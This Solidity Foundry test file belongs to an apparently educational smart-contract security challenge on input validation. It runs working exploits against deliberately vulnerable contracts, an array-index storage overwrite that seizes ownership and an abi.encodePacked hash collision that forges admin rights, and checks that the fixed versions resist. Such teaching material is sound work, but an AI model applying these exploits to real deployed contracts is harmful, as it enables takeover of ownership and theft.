// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {BovedaVulnerable, PermisosVulnerable} from "../src/C10-validacion-entradas/Vulnerable.sol";
import {BovedaFixed, PermisosFixed} from "../src/C10-validacion-entradas/Fixed.sol";

contract C10_ValidacionEntradas is BaseChallenge {
    address internal firmante;
    uint256 internal pk;

    function setUp() public override {
        super.setUp();
        (firmante, pk) = makeAddrAndKey("firmante");
    }

    // Variante A: escritura arbitraria de storage (reto principal)

    function test_Exploit_Vulnerable() public {
        vm.prank(deployer);
        BovedaVulnerable boveda = new BovedaVulnerable();
        assertFalse(boveda.isSolved());

        // base = keccak256(slot_del_array) con el array en el slot 1.
        uint256 base = uint256(keccak256(abi.encode(uint256(1))));
        // indice tal que base + indice = 0 (mod 2^256) -> escribe en el slot 0.
        uint256 indice;
        unchecked {
            indice = 0 - base;
        }

        vm.prank(attacker);
        boveda.editar(indice, uint256(uint160(attacker)));

        assertEq(boveda.owner(), attacker, "owner sobrescrito por escritura arbitraria");
        assertTrue(boveda.isSolved(), "reto resuelto");
    }

    function test_Fixed_Resiste() public {
        vm.prank(deployer);
        BovedaFixed boveda = new BovedaFixed();

        uint256 base = uint256(keccak256(abi.encode(uint256(1))));
        uint256 indice;
        unchecked {
            indice = 0 - base;
        }

        // El bounds check revierte el índice gigante.
        vm.prank(attacker);
        vm.expectRevert(bytes("fuera de rango"));
        boveda.editar(indice, uint256(uint160(attacker)));

        assertFalse(boveda.isSolved(), "owner intacto");
    }

    // Variante B: colisión de hash con encodePacked

    function test_Exploit_HashCollision_Vulnerable() public {
        vm.prank(deployer);
        PermisosVulnerable permisos = new PermisosVulnerable(firmante);

        // El firmante autoriza: admins = [user1], users = [attacker].
        address[] memory adminsHonesto = new address[](1);
        adminsHonesto[0] = user1;
        address[] memory usersHonesto = new address[](1);
        usersHonesto[0] = attacker;
        bytes32 hash = keccak256(abi.encodePacked(adminsHonesto, usersHonesto));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);

        // El atacante recompone: admins = [user1, attacker], users = [].
        // En encodePacked de arrays, cada elemento se rellena a 32 bytes, así que
        // los bytes concatenados son idénticos: mismo hash, misma firma válida.
        address[] memory adminsFalso = new address[](2);
        adminsFalso[0] = user1;
        adminsFalso[1] = attacker;
        address[] memory usersFalso = new address[](0);

        assertTrue(
            permisos.esAdmin(adminsFalso, usersFalso, v, r, s),
            "el atacante se cuela como admin por colision"
        );
    }

    function test_Fixed_HashCollision_Resiste() public {
        vm.prank(deployer);
        PermisosFixed permisos = new PermisosFixed(firmante);

        address[] memory adminsHonesto = new address[](1);
        adminsHonesto[0] = user1;
        address[] memory usersHonesto = new address[](1);
        usersHonesto[0] = attacker;
        // Con abi.encode, la firma se emite sobre este hash concreto.
        bytes32 hash = keccak256(abi.encode(adminsHonesto, usersHonesto));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);

        // La repartición recompuesta produce un hash distinto: la firma no vale.
        address[] memory adminsFalso = new address[](2);
        adminsFalso[0] = user1;
        adminsFalso[1] = attacker;
        address[] memory usersFalso = new address[](0);

        assertFalse(
            permisos.esAdmin(adminsFalso, usersFalso, v, r, s),
            "no hay colision con abi.encode"
        );
        // La repartición honesta sí sigue siendo válida.
        assertTrue(permisos.esAdmin(adminsHonesto, usersHonesto, v, r, s), "firma honesta valida");
    }
}
